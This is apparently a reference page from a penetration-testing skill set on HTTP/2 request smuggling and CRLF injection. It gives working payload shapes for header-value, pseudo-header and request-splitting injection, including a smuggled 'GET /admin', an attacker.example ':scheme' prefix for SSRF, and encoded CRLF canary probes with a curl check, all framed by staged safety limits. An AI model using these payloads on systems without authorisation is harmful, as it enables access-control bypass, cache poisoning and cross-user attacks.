# HTTP/2-exclusive vectors and CRLF injection

Depth for `hunt-http-smuggling`. Read the Engagement Safety Contract in that skill's `SKILL.md` first: the Stage A / Stage B split and the serial / 5-second-delay / 20-attempt-cap / stop-on-first-signal bounds apply to every probe below without exception.

These vectors matter because they survive front-ends that already block plain H2.CL and H2.TE. A target that correctly validates `content-length` and strips `transfer-encoding` from the header *section* can still be desynced through a header *value*, a header *name*, or a pseudo-header.

## CRLF and bare-LF injection into the downgraded request

```
# HTTP/1 bare-newline discrepancy: front-end sees one header, back-end sees two
Foo: bar\nTransfer-Encoding: chunked

# HTTP/2 header value containing a real CRLF. Binary framing gives \r\n no
# special meaning in h2, but the downgrade turns it back into a delimiter.
foo:  bar\r\nTransfer-Encoding: chunked
```

A full `\r\n` produces no HTTP/1-to-HTTP/1 discrepancy, because every HTTP/1 server agrees it terminates a header. The bare `\n` is the HTTP/1 variant, and it works where the front-end does not treat a lone LF as a delimiter but the back-end does. The HTTP/2 form is the stronger one: in HTTP/2 the header boundaries come from explicit offsets in the binary framing, so `\r\n` carries no structural meaning inside a value — until the downgrade writes that value into an HTTP/1 header block and the bytes become a delimiter again.

RFC 9113 §8.2.1 is unusually direct about this: "Failure to validate fields can be exploited for request smuggling attacks." It then sets the minimal validation an implementation **MUST** perform — a field value **MUST NOT** contain NUL (`0x00`), LF (`0x0a`) or CR (`0x0d`) at any position, and a field name **MUST NOT** contain bytes in `0x00-0x20`, `0x41-0x5a` (uppercase ASCII) or `0x7f-0xff`, nor a colon unless it is a pseudo-header. Every vector on this page is one of those rules going unenforced somewhere in the chain.

## H2.X request splitting (double CRLF in a header value)

**Stage B, and skip-in-engagement as written: two complete requests on the back-end is the response-queue-poisoning primitive. Substitute an invalid request line (`H A X`) for the second request if you need to demonstrate the split without desynchronising a live queue.**

```
:method   GET
:path     /
:authority target.example
foo       bar\r\n
          \r\n
          GET /admin HTTP/1.1\r\n
          Host: target.example
```

A double CRLF ends the first request and begins a complete second one, in the headers rather than the body. Three consequences:

- It works with `GET`, so you are no longer restricted to methods allowed to carry a body.
- It survives a front-end that validates `content-length`, because no length header is involved.
- It survives a back-end with no chunked support, for the same reason.

Both resulting requests need a `Host`. Front-ends typically strip `:authority` and append a freshly built `Host` at the end of the header block, so the position of your injected `Host` has to account for where the append lands. Get this wrong and one of the two requests is missing a mandatory header, which the back-end rejects — and a rejection on a shared socket is still a disruption you caused.

## Pseudo-header abuse

Some of these need no downgrade at all, which is why they outlive downgrade-focused fixes.

| Vector | Shape | Effect |
|---|---|---|
| `:method` with spaces | `:method: GET /admin HTTP/1.1 ` | Request-line injection; bypassed `ProxyMatch` deny rules and escaped `ProxyPass` subfolders in Apache `mod_proxy` (CVE-2021-33193) |
| CRLF in a pseudo-header | `:path: /x\r\nTransfer-Encoding: chunked` | Request-line injection and H2.TE where header *values* were filtered but pseudo-headers were not |
| Header **name** injection | a header whose name contains `:` or a newline | Bypasses a hotfix that only filtered values |
| `:scheme` with arbitrary bytes | `:scheme: https://attacker.example/x?` | URL-prefix injection where the front-end builds an upstream URL from it — path override, cache poisoning, SSRF, all without a downgrade |
| Duplicate `:path` | two `:path` pseudo-headers | Hops disagree about which one is authoritative |
| `:authority` **and** `Host` together | both present | Ambiguous host; hand the result to `hunt-host-header` |

A hotfix that blocks `\r\n` but not a bare `\n` is still exploitable — that exact gap appeared in the Atlassian fix sequence, where the first patch blocked newlines in header values, the second was bypassed through header names, and the third through pseudo-headers.

To send these from a script, Turbo Intruder's HTTP/2 engines rewrite `^` to `\r`, `~` to `\n` and `` ` `` to `:`, and let you override a pseudo-header by writing it as an ordinary header (`:path: /robots.txt`). Burp's Inspector sidebar edits raw HTTP/2, including pseudo-headers, newlines and spaces in paths.

## CRLF injection into the *response* — header injection and response splitting

The mirror image of everything above. Instead of injecting a delimiter into the request a proxy forwards, you inject one into a header the application reflects back into its own response. This is CWE-113, "Improper Neutralization of CRLF Sequences in HTTP Headers", a variant of CWE-93 ("Improper Neutralization of CRLF Sequences"); MITRE names cache poisoning, cross-site scripting, cross-user defacement and page hijacking as the attacks it enables, with Integrity and Access Control as the affected scopes.

Hunt it wherever user input reaches a response header: `Location` on a redirect, `Set-Cookie`, a tracking or correlation-ID header, a `Content-Disposition` filename.

**Stage A — one injected canary header, read back in your own response. Nothing is shared and nothing persists.**

```
# single injected header; the canary is what proves the server split the line
/redirect?next=%0d%0aX-Canary-a7f3c1%3a%20present

# variants when %0d%0a is filtered: bare LF, and the UTF-8 overlong forms
# that some normalisers fold down to CR and LF
/redirect?next=%0aX-Canary-a7f3c1%3a%20present
/redirect?next=%E5%98%8A%E5%98%8DX-Canary-a7f3c1%3a%20present
```

Confirmation is `X-Canary-a7f3c1: present` appearing as a **real header**:

```bash
curl -sD - 'https://target.example/redirect?next=%0d%0aX-Canary-a7f3c1%3a%20present' -o /dev/null \
  | grep -i 'x-canary-a7f3c1'
```

Check the header block, never a rendered page. A reflected string in the body is not a split header, and treating it as one is the most common false positive in this class. One canary header, read back by you, is the whole Stage A test.

**Stage B — a double CRLF ends the header section and hands you the response body, which is full response splitting. That is where cache poisoning, cross-user defacement and XSS live, and where a cache turns your proof into everyone's problem. Sign-off, a named window and a cachebuster.**

Two differences from request smuggling matter for triage:

1. The injection point is a *parameter*, so the finding is reproducible and attributable without ever touching a shared socket. That makes the Stage A half genuinely safe, unlike the desync families.
2. The same primitive feeds `hunt-cache-poison` directly, because a split response the edge stores is indistinguishable from a legitimate one.

A CRLF inside a *request* header value that the front-end then forwards is request-side, not response-side, and belongs with the bare-LF discrepancy at the top of this page. Keep the two apart in the report: they have different root causes and different fixes.
